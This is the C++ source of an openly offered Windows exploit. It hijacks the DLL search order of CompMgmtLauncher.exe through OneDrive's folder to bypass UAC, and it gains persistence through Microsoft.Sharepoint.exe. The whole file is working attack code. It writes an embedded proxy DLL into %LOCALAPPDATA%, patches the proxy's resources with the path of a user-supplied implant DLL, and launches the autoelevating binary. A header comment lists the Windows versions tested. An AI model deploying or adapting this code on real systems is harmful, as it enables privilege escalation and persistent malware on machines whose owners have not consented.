/* CompMgmtLauncher & Sharepoint DLL Search Order hijacking UAC/persist
* =====================================================================
* CompMgmtLauncher.exe is vulnerable to to a DLL Search Order hijacking 
* vulnerability. The binary, will perform a search within user env for 
* the DLL's Secur32.dll or Wininet.dll when Onedrive is installed. 
* CompMgmtLauncher.exe has autoelavate enabled on some versions of Windows 
* 10. This can be exploited using a Proxy DLL to execute code as autoelevate
* is enabled and OneDrive is installed by default on Windows 10 Desktop. On
* Windows 11 this provides a useful persistence capability in Microsoft.Sharepoint.exe. 
*
* This issue has a fix in Windows 10 1703 and up as the manifest runs 
* asInvoker, preventing misuse for UAC elevation. OneDrive must be installed 
* to exploit this issue, which is a default configuration on Windows 10.
* 
* Injecting into CompMgtLauncher.exe behaves differently on x64 and x86,
* DLL sideloading maybe most stable with wininet x86. You can also use this 
* to persist and sideload via Microsoft.Sharepoint.exe which reads from 
* the OneDrive location. To exploit OneDrive, you have to find OneDrive
* version for path which is a moving target and easily read from host.
* 
* This exploit has been tested against the following product versions:
*
*  Windows 10 1507 x64 (tested - not vuln.)
*  Windows 10 1511 x64 (vulnerable) 
*  Windows 10 1607 x64 (tested - not vuln)
*  Windows 11 21996.1 x64 (Persistence / LOLbin / Microsft.Sharepoint.exe)
* 
* TODO; This project will compile for x86, but needs adding secur32_org.dll 
* from x86 as using embedded x64 only. 
* 
* -- Hacker Fantastic
* https://hacker.house
*/
#include <iostream>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <tchar.h>
#include <wchar.h>
#include <winternl.h>
#define SECURITY_WIN32 1
#include <security.h>
#include "resource.h"
using namespace std;

/* linker lib comment includes for static */
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"AdvApi32.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Oleaut32.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"Secur32.lib")

/* program defines for fixed size vars */
#define MAX_ENV_SIZE 32767

/* extract a "DLL" type resource from the PE */
bool ExtractResource(int iId, LPWSTR pDest)
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char* aFilePtr;
	unsigned long aFileSize;
	HANDLE file_handle;
	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
	if (!aResourceH)
	{
		return false;
	}
	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal)
	{
		return false;
	}
	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
	if (!aFilePtr)
	{
		return false;
	}
	file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == file_handle)
	{
		int err = GetLastError();
		if ((ERROR_ALREADY_EXISTS == err) || (32 == err))
		{
			return true;
		}
		return false;
	}
	while (aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(file_handle);
	return true;
}

/* the main exploit routine */
int main(int argc, char* argv[])
{
	LPWSTR pDLLpath;
	size_t sSize = 0;
	BOOL bResult;
	HKEY hUserSID = NULL;
	HKEY hRegKey = NULL;
	HANDLE hToken = NULL;
	DWORD dwErrorCode = 0;
	DWORD dwBufferSize = 0;
	PTOKEN_USER pTokenUser = NULL;
	SHELLEXECUTEINFO shinfo;
	// handle user argument for command
	if (argc != 2) {
		// argument is passed directly to WinExec() via DLL
		printf("[!] Error, you must supply a DLL to load e.g. c:\\\\Temp\\\\implant64.dll\n");
		return EXIT_FAILURE;
	}
	// multi-byte string to wide char string to convert user command into pDLL
	pDLLpath = new TCHAR[MAX_PATH + 1];
	mbstowcs_s(&sSize, pDLLpath, MAX_PATH, argv[1], strlen(argv[1]));

	// Find the AppData Path for OneDrive, check the folder for 2xxx.x.xx.x.x blah version folder.
	// write out to amd64 and also root location, unless 32bit. These paths change amongst patches.
	// 
	// * on 64bit hosts write to C:\Users\User\AppData\Local\Microsoft\OneDrive\21.220.1024.0005\amd64 *sometimes*
	// * on 32bit hosts write to C:\Users\User\AppData\Local\Microsoft\OneDrive\21.220.1024.0005 *always*
	// 
	// test windows 11 22.225.1026.0001 x64 unstable
	// test windows 11 23.086.0423.0001 x64 unstable
	// 
	// locate %LOCALAPPDATA% environment variable to concat onto
	LPWSTR pAppPath = new WCHAR[MAX_ENV_SIZE];
	GetEnvironmentVariable(L"LOCALAPPDATA", pAppPath, MAX_ENV_SIZE);
	// this is a Windows 11 21996.1 x64 target.
#ifdef _M_IX86
	// writes the proxy DLL to %LOCALAPPDATA%
	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32.dll") + 1;
	LPWSTR pBinPatchPath = new WCHAR[sSize];
	swprintf(pBinPatchPath, sSize, L"%s\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32.dll", pAppPath);
	// writes the original DLL to %LOCALAPPDATA%
	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32_org.dll") + 1;
	LPWSTR pBinOrigPath = new WCHAR[sSize];
	swprintf(pBinOrigPath, sSize, L"%s\\Microsoft\\OneDrive\\22.225.1026.0001\\Secur32_org.dll", pAppPath);
#elif _M_X64 // sometimes different path
	// writes the proxy DLL to %LOCALAPPDATA% - works on test box Windows 11 21996.1 x64
	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\OneDrive\\23.086.0423.0001\\Secur32.dll") + 1;
	LPWSTR pBinPatchPath = new WCHAR[sSize];
	swprintf(pBinPatchPath, sSize, L"%s\\Microsoft\\OneDrive\\23.086.0423.0001\\Secur32.dll", pAppPath);
	// writes the original DLL to %LOCALAPPDATA%
	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\OneDrive\\23.086.0423.0001\\Secur32_org.dll") + 1;
	LPWSTR pBinOrigPath = new WCHAR[sSize];
	swprintf(pBinOrigPath, sSize, L"%s\\Microsoft\\OneDrive\\23.086.0423.0001\\Secur32_org.dll", pAppPath);
#else
	// no ARM support. 
	return EXIT_SUCCESS;
#endif
	if (ExtractResource(IDR_DLLORIG, pBinOrigPath))
	{
		if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
		{
			// string table structure creation hack using wstring's for user command
			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pDLLpath, L"" };
			vector< WORD > buffer;
			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
			{
				size_t pos = buffer.size();
				buffer.resize(pos + data[index].size() + 1);
				buffer[pos++] = static_cast<WORD>(data[index].size());
				copy(data[index].begin(), data[index].end(), buffer.begin() + pos);
			}
			// do not delete the existing resource entries
			HANDLE hPE = BeginUpdateResource(pBinPatchPath, false);
			// overwrite the IDS_CMD101 string table in the payload DLL with user command.
			bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]), buffer.size() * sizeof(WORD));
			bResult = EndUpdateResource(hPE, FALSE);
			// TODO: should also really read %systemroot% here in case no standard path.
			RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
			shinfo.cbSize = sizeof(shinfo);
			shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
#ifdef _M_IX86
			// won't spawn on x64 from .exe
			shinfo.lpFile = L"C:\\Windows\\System32\\CompMgmtLauncher.exe";
#elif _M_X64
			shinfo.lpFile = L"CompMgmtLauncher.exe";
			// fire up \\Microsoft\\OneDrive\\23.086.0423.0001\\Microsoft.Sharepoint.exe if you just want a user sideload / persistence on login
#endif
			shinfo.lpParameters = L""; // parameters
			shinfo.lpDirectory = NULL;
			shinfo.nShow = SW_SHOW;
			shinfo.lpVerb = NULL;
			bResult = ShellExecuteEx(&shinfo);
			if (bResult) {
				printf("[+] Success\n");
			}
		}
	}
	return EXIT_SUCCESS;
}